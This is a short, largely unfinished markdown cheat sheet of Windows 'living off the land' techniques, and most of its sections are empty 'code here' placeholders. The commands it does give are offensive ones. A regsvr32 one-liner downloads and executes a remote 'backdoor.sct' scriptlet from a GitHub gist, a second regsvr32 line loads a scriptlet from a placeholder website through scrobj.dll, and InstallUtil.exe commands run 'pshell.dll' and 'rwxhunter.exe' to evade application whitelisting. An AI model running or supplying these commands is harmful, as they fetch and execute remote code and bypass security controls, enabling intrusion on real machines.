# Native - Living off the land

## One Liners

### Regsvr32 + sct file + powershell encoded command

    regsvr32.exe /s https://gist.githubusercontent.com/MHaggis/31a1d0efd882d048436aeb7b9fd7f6d0/raw/b96dc20465abfeed3f05ba56b28e2ff91c398606/backdoor.sct

## net.exe

Input:

    code here

Output:

    code here

## Regsvr32.exe

Input:

    code here

Output:

    code here

    regsvr32.exe /s /n /u /i:https://<website>/data scrobj.dll

## waitfor.exe

Input:

    code here

Output:

    code here

## wmic.exe


Input:

    code here

Output:

    code here

## Installutil.exe

Download the two binaries:

Input for pshell.dll:

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U pshell.dll

Input for rwxhunter.exe:

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U rwxhunter.exe
